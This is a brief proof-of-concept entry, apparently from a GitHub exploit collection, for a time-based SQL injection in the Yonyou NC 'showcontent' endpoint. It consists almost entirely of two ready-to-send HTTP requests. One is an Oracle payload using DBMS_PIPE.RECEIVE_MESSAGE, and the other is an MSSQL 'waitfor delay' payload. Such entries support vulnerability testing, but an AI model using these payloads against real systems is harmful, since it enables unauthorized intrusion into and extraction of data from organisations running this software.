# yonyounc_showcontent_sqli

from:  https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC-showcontent%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
2024.4.22 @2

```
orale:
GET /ebvp/infopub/showcontent?id=1'%20AND%203983=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(76)||CHR(108)||CHR(101),9)%20AND%20'Mgtn'='Mgtn HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: identity
Connection: close
Content-Type: text/xml; charset=utf-8
SL-CE-SUID: 31



mssql:
GET /ebvp/infopub/showcontent?id=1'%20waitfor%20delay%20'0:0:6
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36

```
